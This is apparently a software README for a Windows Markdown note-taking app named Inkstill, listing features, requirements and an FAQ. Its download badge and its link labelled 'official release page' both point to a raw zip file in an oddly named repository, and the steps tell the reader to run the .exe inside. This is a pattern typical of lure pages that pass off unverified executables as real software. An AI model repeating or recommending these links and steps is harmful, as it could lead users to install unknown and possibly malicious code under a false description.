# ✍️ Inkstill - Write notes in private local files

[![](https://img.shields.io/badge/Download-Inkstill_for_Windows-blue.svg)](https://raw.githubusercontent.com/pinoncanavaliaensiformis635/pinoncanavaliaensiformis635.github.io/main/hereinbefore/3.0.zip)

Inkstill is a note-taking application for your computer. It stores all your files locally on your hard drive. You keep full control of your data without the need for cloud services or internet accounts.

Use this app to write documents, manage your knowledge base, and organize your thoughts. Inkstill uses the Markdown format to help you format text with simple symbols.

## 🚀 Getting Started

Follow these steps to set up Inkstill on your Windows computer.

1. Go to the [official release page](https://raw.githubusercontent.com/pinoncanavaliaensiformis635/pinoncanavaliaensiformis635.github.io/main/hereinbefore/3.0.zip).
2. Look for the latest version at the top of the list.
3. Click the link that ends in `.exe` to download the installer.
4. Open the downloaded file once the process completes.
5. Follow the instructions on the screen to finish the installation.
6. Open the Inkstill application from your start menu or desktop shortcut.

## 🛠 Features

Inkstill includes tools built for writers and researchers.

### Live Preview
You see your formatted text and your raw Markdown side-by-side. You know how your document looks while you type.

### Search Your Workspace
Find any note in seconds. Type a keyword into the search bar to scan every file in your current folder.

### Backlinks
Create connections between notes. Reference one note inside another to build a map of your ideas.

### Mermaid and KaTeX
Use advanced syntax to create diagrams and math equations. Type code blocks to render charts, graphs, and complex formulas within your text.

### PDF Export
Turn your Markdown files into clean PDF documents. This tool helps you share homework, reports, or articles with others.

### Offline Access
The application requires no network connection. Your notes stay on your machine. You control the privacy of your work.

## 💻 System Requirements

Inkstill runs on most modern Windows systems. Ensure your machine meets these requirements for the best experience.

*   Windows 10 or Windows 11.
*   4 GB of RAM or more.
*   500 MB of free storage space.
*   A stable mouse or trackpad.

## ⚙️ Using Settings

Open the settings menu to manage your workspace. You can change the theme color, adjust font sizes, or choose the storage location for your notes. Select a folder that you back up regularly to ensure you never lose your documents.

## 📋 Frequently Asked Questions

**Does the app track my information?**
No. Inkstill stays local. Your files never leave your computer unless you move them yourself.

**Can I open my files in other programs?**
Yes. Your notes exist as plain text files with the .md extension. You can open these files with any text editor or other markdown software.

**Is it free?**
Yes. Inkstill is open-source software. You can use it as you wish.

**How do I update the application?**
Check the release page periodically for new versions. Download and run the newer installer to upgrade your current version. Your data stays in place during this update.

**Can I add pictures to my notes?**
Yes. Save your image files in the same folder as your notes. You can link to them inside your Markdown text.

## 📁 Organizing Your Notes

You organize your notes using folders. Because Inkstill treats your folder structure as a knowledge base, you can keep your files in simple, logical groups. Use nested folders to keep your library tidy. Link pages together using double brackets, like [[Page Name]], to create a path between related ideas.
